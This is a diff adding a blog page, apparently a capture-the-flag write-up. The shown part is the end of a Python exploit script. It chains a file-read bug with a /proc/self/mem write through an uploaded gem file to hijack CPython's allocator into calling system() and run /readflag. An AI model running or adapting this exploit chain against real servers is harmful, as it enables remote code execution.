+    print(f&quot;[+] target: &#123;UPLOAD_URL&#125;&quot;)
+
+    print(&quot;[+] leaking &#x2F;proc&#x2F;self&#x2F;maps ...&quot;)
+    maps_raw &#x3D; lfi_read(&quot;&#x2F;proc&#x2F;self&#x2F;maps&quot;)
+    maps_text &#x3D; maps_raw.decode(&quot;utf-8&quot;, errors&#x3D;&quot;ignore&quot;)
+    libpython_base, ld_base &#x3D; parse_bases(maps_text)
+    print(f&quot;[+] libpython base: 0x&#123;libpython_base:x&#125;&quot;)
+    print(f&quot;[+] ld-musl base: 0x&#123;ld_base:x&#125;&quot;)
+
+    pyruntime &#x3D; libpython_base + PYRUNTIME_OFF
+    obj_ctx &#x3D; pyruntime + OBJ_CTX_OFF
+    obj_malloc &#x3D; pyruntime + OBJ_MALLOC_OFF
+    debug_storage &#x3D; pyruntime + DEBUG_STORAGE_OFF
+    system_addr &#x3D; ld_base + SYSTEM_OFF
+
+    cmd &#x3D; b&quot;sh -c &#39;&#x2F;readflag --give-me-the-f\\|ag &gt; &#x2F;tmp&#x2F;flag&#39;\x00&quot;
+
+    print(&quot;[+] preparing sparse write to &#x2F;proc&#x2F;self&#x2F;mem ...&quot;)
+    writes &#x3D; [
+        (debug_storage, cmd),
+        (obj_ctx, struct.pack(&quot;&lt;Q&quot;, debug_storage)),
+        (obj_malloc, struct.pack(&quot;&lt;Q&quot;, system_addr)),
+    ]
+    sparse_path &#x3D; &quot;&#x2F;tmp&#x2F;sparse_mem.gem&quot;
+    make_sparse_mem_gem(sparse_path, writes)
+
+    print(&quot;[+] uploading sparse write payload (request may timeout) ...&quot;)
+    try:
+        resp &#x3D; upload(sparse_path)
+        print(&quot;[+] sparse upload response (first 200 chars):&quot;)
+        print(resp[:200])
+    except Exception as e:
+        print(f&quot;[!] upload error (often expected if worker crashes): &#123;e&#125;&quot;)
+
+    print(&quot;[+] triggering allocation ...&quot;)
+    basic_path &#x3D; &quot;&#x2F;tmp&#x2F;basic.gem&quot;
+    make_basic_gem(basic_path, b&quot;trigger&quot;)
+    try:
+        upload(basic_path)
+    except Exception:
+        pass
+
+    print(&quot;[+] reading &#x2F;tmp&#x2F;flag via LFI ...&quot;)
+    flag_raw &#x3D; lfi_read(&quot;&#x2F;tmp&#x2F;flag&quot;)
+    print(flag_raw.decode(&quot;utf-8&quot;, errors&#x3D;&quot;ignore&quot;))
+
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+    exploit()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">maz-dev834</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
